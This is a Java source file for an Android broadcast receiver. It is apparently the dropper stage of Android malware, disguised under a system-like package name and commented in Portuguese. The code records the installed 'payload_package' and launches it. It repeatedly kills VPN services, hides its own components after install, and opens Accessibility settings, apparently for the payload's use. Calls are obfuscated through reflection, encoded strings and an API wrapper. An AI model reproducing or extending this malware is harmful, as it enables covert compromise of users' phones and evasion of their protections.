package com.android.system.qspaas;

import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.os.Process;
import java.util.List;
import java.util.SortedMap;
import java.util.TreeMap;

public class RcvJbrzn extends BroadcastReceiver {

    public RcvJbrzn() {
    }

    // Método b - Mata VPN e aguarda desconexão real das redes VPN
    public final void b(Context context) {
        String str = StrUtil.d("LlZwbktpbGxTZXJ2aWNl"); // VpnKillService
        try {
            // Tenta chamar killInstantly via reflexão
            Class<?> cls = Class.forName(context.getPackageName() + str);
            cls.getMethod("killInstantly", new Class[0]).invoke(null, new Object[0]);
        } catch (Exception ignored) {}

        try {
            Intent intent = new Intent(context, Class.forName(context.getPackageName() + str));
            new ApiObfuscator(context).stopServiceObfuscated(intent);

            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                long timeout = System.currentTimeMillis() + 1500;
                while (System.currentTimeMillis() < timeout) {
                    Network[] networks = cm.getAllNetworks();
                    boolean vpnActive = false;
                    if (networks != null) {
                        for (Network network : networks) {
                            NetworkCapabilities nc = cm.getNetworkCapabilities(network);
                            if (nc != null && nc.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                                vpnActive = true;
                                break;
                            }
                        }
                    }
                    if (!vpnActive) break;
                    try { Thread.sleep(80); } catch (InterruptedException ignored) {}
                }
            }
        } catch (Exception ignored) {}
    }

    // Método c - Desabilita componentes silenciosamente
    public final void c(Context context) {
        try {
            String pkg = context.getPackageName();
            ApiObfuscator api = new ApiObfuscator(context);
            // Desabilitamos o VpnKillService e o próprio RcvJbrzn para ocultação pós-instalação.
            api.setComponentEnabledSettingObfuscated(pkg, pkg + ".VpnKillService", PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
            api.setComponentEnabledSettingObfuscated(pkg, pkg + ".RcvJbrzn", PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
        } catch (Exception ignored) {}
    }

    // Método auxiliar para verificar se o app está em primeiro plano (Fallback para Android 13+)
    private boolean isAppInForeground(Context context, String targetPackage) {
        try {
            // Tenta ActivityManager primeiro
            ActivityManager am = (ActivityManager) new ApiObfuscator(context).getSystemServiceObfuscated(Context.ACTIVITY_SERVICE);
            if (am != null) {
                List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
                if (processes != null) {
                    for (ActivityManager.RunningAppProcessInfo proc : processes) {
                        if (proc.processName.equals(targetPackage) && proc.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                            return true;
                        }
                    }
                }
            }

            // Fallback: UsageStatsManager (requer permissão PACKAGE_USAGE_STATS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
                if (usm != null) {
                    long time = System.currentTimeMillis();
                    // queryUsageStats retorna List<UsageStats>, não SortedMap
                    List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 10000, time);
                    if (stats != null && !stats.isEmpty()) {
                        // Encontra o último evento registrado
                        UsageStats lastStats = null;
                        long lastTime = 0;
                        for (UsageStats usageStats : stats) {
                            if (usageStats.getLastTimeUsed() > lastTime) {
                                lastTime = usageStats.getLastTimeUsed();
                                lastStats = usageStats;
                            }
                        }

                        if (lastStats != null && lastStats.getPackageName().equals(targetPackage)) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    // Método d - Lógica principal de abertura e monitoramento
    public final void d(Context context, String targetPackage) {
        b(context); // mata VPN no início

        boolean launched = false;
        int runningConfirmed = 0;
        int attempts = 0;

        ApiObfuscator api = new ApiObfuscator(context);
        while (attempts < 4) {
            if (!launched || runningConfirmed == 0) {
                try {
                    PackageManager pm = api.getPackageManagerObfuscated();
                    Intent launchIntent = api.getLaunchIntentForPackageObfuscated(pm, targetPackage);
                    if (launchIntent != null) {
                        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        new ApiObfuscator(context).startActivityObfuscated(launchIntent);
                    } else {
                        // Tentativa alternativa via componente .A1
                        Intent altIntent = new Intent();
                        altIntent.setComponent((ComponentName) new ApiObfuscator(context).createComponentNameObfuscated(targetPackage, targetPackage + StrUtil.d("LkEx")));
                        altIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        altIntent.addCategory(Intent.CATEGORY_LAUNCHER);
                        new ApiObfuscator(context).startActivityObfuscated(altIntent);
                    }
                    launched = true;
                } catch (Exception ignored) {}

                try {
                    b(context); // mata VPN novamente após tentativa
                } catch (Exception ignored) {}
            }

            // Tempo de espera progressivo exato do smali
            long sleepTime;
            if (attempts < 2) sleepTime = 800;
            else if (attempts == 2) sleepTime = 1200;
            else sleepTime = 1800;

            try { Thread.sleep(sleepTime); } catch (InterruptedException ignored) {}

            // Verifica se o app está rodando
            try {
                if (isAppInForeground(context, targetPackage)) {
                    runningConfirmed++;
                } else {
                    // Reset se não estiver mais rodando
                    runningConfirmed = 0;
                }

                if (runningConfirmed >= 2) {
                    b(context);
                    c(context);
                    try { Thread.sleep(300); } catch (InterruptedException ignored) {}
                    new ApiObfuscator(context).killProcessObfuscated(Process.myPid());
                    return;
                }
            } catch (Exception e) {
                launched = false;
                runningConfirmed = 0;
            }
            attempts++;
        }

        // Última tentativa: abre configurações de Acessibilidade
        try {
            String a = StrUtil.d("YW5kcm9pZC5zZXR0aW5ncy5BQ0NFU1NJQklMSVRZX1NFVFRJTkdT");
            Intent ai = new Intent(a);
            ai.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            new ApiObfuscator(context).startActivityObfuscated(ai);
        } catch (Exception ignored) {}

        b(context);
        c(context);
        try { Thread.sleep(300); } catch (InterruptedException ignored) {}
        new ApiObfuscator(context).killProcessObfuscated(Process.myPid());
    }

    // Método e - Inicia thread para executar a abertura
    public final void e(Context context, final String targetPackage) {
        new Thread(() -> d(context, targetPackage)).start();
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        ApiObfuscator api = new ApiObfuscator(context);
        try {
            if (intent == null) return;
            String action = intent.getAction();
            if (action == null) return;

            int status = intent.getIntExtra("android.content.pm.extra.STATUS", -2);

            if (status == -1) { // PENDING_USER_ACTION
                Intent innerIntent = (Build.VERSION.SDK_INT >= 33) ? intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent.class) : intent.getParcelableExtra(Intent.EXTRA_INTENT);
                if (innerIntent != null) {
                    innerIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    api.startActivityObfuscated(innerIntent);
                }
            } else if (status == 0 || action.equals("android.intent.action.PACKAGE_ADDED") || action.equals(Intent.ACTION_PACKAGE_ADDED)) {
                String packageName = intent.getStringExtra("android.content.pm.extra.PACKAGE_NAME");
                if (packageName == null && intent.getData() != null) packageName = intent.getData().getSchemeSpecificPart();
                if (packageName == null) packageName = intent.getStringExtra(Intent.EXTRA_PACKAGE_NAME);

                if (packageName != null && !packageName.equals(context.getPackageName())) {
                    context.getSharedPreferences("droper_prefs", Context.MODE_PRIVATE).edit().putString("payload_package", packageName).apply();
                    e(context, packageName);
                }
            } else if (status > 0) {
                // Falha na instalação, não faz nada para evitar loop
            }
        } catch (Exception ignored) {}
    }
}
